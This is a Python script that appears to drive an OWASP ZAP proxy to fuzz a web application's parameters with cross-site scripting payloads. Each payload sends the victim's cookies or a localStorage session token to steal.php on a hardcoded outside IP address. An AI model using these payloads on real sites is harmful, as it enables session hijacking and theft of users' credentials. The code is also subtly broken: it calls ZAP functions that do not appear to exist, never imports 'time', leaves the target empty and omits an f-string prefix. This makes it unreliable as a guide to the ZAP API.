from zapv2 import ZAPv2
import requests
from Common.SaveResult import write_file

# Start ZAP proxy
ZAP_PATH = '/./zap.sh'  # Actual path to zap.sh
ZAP_API_KEY = 'zap_api_key'  # ZAP API key
controlled_server = "13.67.128.27"

# Set up ZAP proxy
zap = ZAPv2(apikey=ZAP_API_KEY, proxies={'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'})
zap.core.new_session()

# Target endpoint for interception and fuzzing
target_endpoint = ''

# Configure session to proxy through ZAP
session = requests.Session()
session.proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Fuzzing payloads
fuzz_payloads = [
    f'<script>document.location="{controlled_server}/steal.php?cookie="+document.cookie;</script>',
    f'<img src="x" onerror="document.location=\'{controlled_server}/steal.php?cookie=\'+document.cookie">',
    f'<script>document.location="{controlled_server}/steal.php?session="+localStorage.getItem(\'sessionToken\');</script>',
    f'<iframe src="data:text/html,<script>document.location=\'{controlled_server}/steal.php?cookie=\'+document.cookie+\'&session=\'+localStorage.getItem(\'sessionToken\')</script>"></iframe>',
    f'<script>var xhr=new XMLHttpRequest();xhr.open(\'GET\',\'{controlled_server}/steal.php?session=\'+localStorage.getItem(\'sessionToken\'),true);xhr.send();</script>'
]

# Intercept requests to the target endpoint
print(f"Intercepting requests to {target_endpoint}...")
try:
    response = session.get(target_endpoint)
except requests.exceptions.ProxyError:
    # ZAP will intercept the request, causing a ProxyError in the script
    pass

# Get fuzzable parameters
fuzzable_parameters = zap.pscan.records_to_scan()
print(f"Fuzzable parameters: {fuzzable_parameters}")

# Fuzz each parameter with payloads
for parameter in fuzzable_parameters:
    for payload in fuzz_payloads:
        # Create a new session for each fuzzing attempt
        zap.core.new_session()
        zap.core.exclude_from_proxy(target_endpoint)
        zap.core.set_home_directory()
        zap.pscan.set_enabled(enabled=True)
        zap.pscan.set_mode(mode='attack')
        
        # Fuzz the parameter
        zap.pscan.exclude_from_proxy(url=target_endpoint, parameter=parameter['param'])
        zap.pscan.set_enabled(enabled=True)
        zap.pscan.set_mode(mode='attack')
        zap.pscan.set_payload_parameter(param=parameter['param'], value=payload)

        # Perform the attack
        zap.pscan.scan()

        # Wait for the scan to complete
        while zap.pscan.status != '100':
            print(f"Fuzzing {parameter['param']} with payload {payload} - Progress: {zap.pscan.status}%")
            time.sleep(2)

        # Display the results
        results = []
        results.append("Fuzzing {parameter['param']} with payload {payload} - Results:")
        for alert in zap.core.alerts():
            results.append(alert['alert'])
        write_file("webapp", results)